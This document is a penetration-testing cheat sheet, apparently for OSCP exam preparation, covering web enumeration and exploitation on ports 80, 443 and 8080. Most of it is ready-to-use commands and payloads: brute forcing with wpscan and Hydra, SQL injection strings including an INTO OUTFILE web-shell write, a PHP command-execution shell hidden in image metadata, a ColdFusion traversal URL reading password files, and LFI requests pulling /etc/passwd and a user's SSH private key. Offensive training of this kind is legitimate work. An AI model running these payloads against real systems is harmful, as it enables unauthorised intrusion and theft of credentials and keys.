# HTTP/HTTPS

## Port 80 , 8080, 443:

When executing Nmap, you may discover HTTP ports like 80, 81, 8080, 8000, 443, etc. There's a possibility of finding four HTTP ports on one machine.

In the very first step, run Nmap with an aggressive scan on all ports:

    nmap -sC -sV -A -T4 -Pn -p80,81,8000,8080,443 192.168.146.101

Simply copy the version name of the website and search on Google to find an exploit.

Furthermore, Nmap reveals some files such as robots.txt, index.html, index.php, login.php, cgi-sys, cgi-mod, and cgi-bin.

If you encounter a host error, find a hostname with port 53 or discover a name in the website source code, footer, contact us, etc.

Then add that discovered domain in the /etc/hosts file to access the site.

## Content Discovery

    gobuster dir -u http://192.168.10.10 -w /wd/directory-list-2.3-big.txt (simple run)

    gobuster dir -u http://192.168.10.10:8000 -w /wd/directory-list-2.3-big.txt (with different port)

    gobuster dir -u http://192.168.10.10/noman -w /wd/directory-list-2.3-big.txt (if you find noman then enumerate noman directory)

With the help of content discovery, you will find hidden directories, CMS web logins, files, etc. This is a crucial step in OSCP+.


Utilizing content discovery and Nmap, you can identify CMS, static pages, dynamic websites, and important files like databases, .txt, .pdf, etc. Additionally, you can enumerate websites with automated tools such as WPScan, JoomScan, Burp Suite, and uncover web vulnerabilities like RCE, SQLi, upload functionality, XSS, etc.

If you find any CMS like WordPress, Joomla, etc., simply search on Google for default credentials or exploits of theme, plugin, version etc. In the case of a login page, you can exploit SQL injection and launch a brute-force attack with Hydra. If you identify any CMS, scan it with tools, perform enumeration with brute force, check default usernames and passwords, explore themes, plugins, version exploits, and search on Google. Alternatively, you can discover web vulnerabilities to gain initial access.

## Wordpress


    wpscan --url http://10.10.10.10 --enumerate u

    wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN

    wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt

    wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt

## Drupal

    droopescan scan drupal -u http://example.org/ -t 32

find version 
    
    /CHANGELOG.txt

## Adobe Cold Fusion

Check version

    /CFIDE/adminapi/base.cfc?wsdl

fckeditor Version 8 LFI

    http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

## Elastix

Google the vulnerabilities

default login are 

    admin:admin at /vtigercrm/

able to upload shell in profile-photo

## Joomla

Admin page 

    /administrator

Configuration files

    configuration.php | diagnostics.php | joomla.inc.php | config.inc.php

## Mambo

    configuration.php | config.inc.php

## Login Page

Try common credentials such as admin/admin, admin/password and falafel/falafel.

Determine if you can enumerate usernames based on a verbose error message.

Manually test for SQL injection. If it requires a more complex SQL injection, run SQLMap on it.

If all fails, run hydra to brute force credentials.

View source code

Use default password

Brute force directory first (s’’ometime you don't need to login to pwn the machine)

Search credential by bruteforce directory

bruteforce credential

Search credential in other service port

Enumeration for the credential

Register first

SQL injection

XSS can be used to get the admin cookie

Bruteforce session cookie

## SQLi

Pentestmonkey cheatsheet

Try 

    admin'# (valid username, see netsparker sqli cheatsheet)

Try 

    abcd' or 1=1;--

Use UNION SELECT null,null,.. instead of 1,2,.. to avoid type conversion errors

For mssql,

xp_cmdshell

Use concat for listing 2 or more column data in one

For mysql,

try a' or 1='1 -- -

    A' union select "" into outfile "C:\xampp\htdocs\run.php" -- -'

## File Upload

Change mime type

Add image headers

Add payload in exiftool comment and name file as file.php.png

#### 1) 

    echo <?php system($_GET['cmd']); ?> shell.php 
    
#### 2) 

    exiftool "-comment<=shell.php" malicious.png 
    
#### 3) 

    strings malicious.png | grep system

use automated tool

    nikto • nikto -h $ip • nikto -h $ip -p 80,8080,1234 #test different ports with one scan

## Git

Download .git

    mkdir <DESTINATION_FOLDER>

    ./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>

Extract .git content

    mkdir <EXTRACT_FOLDER>

    ./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>

## LFI and RFI


IF LFI FOUND then start with

    ../../../../etc/passwd

SSH keys are

By default, SSH searches for id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa 

    curl http://rssoftwire.com/noman/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa

with encode

    curl http://192.168.10.10/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

## SSL Enumeration

    openssl s_client -connect $ip:443
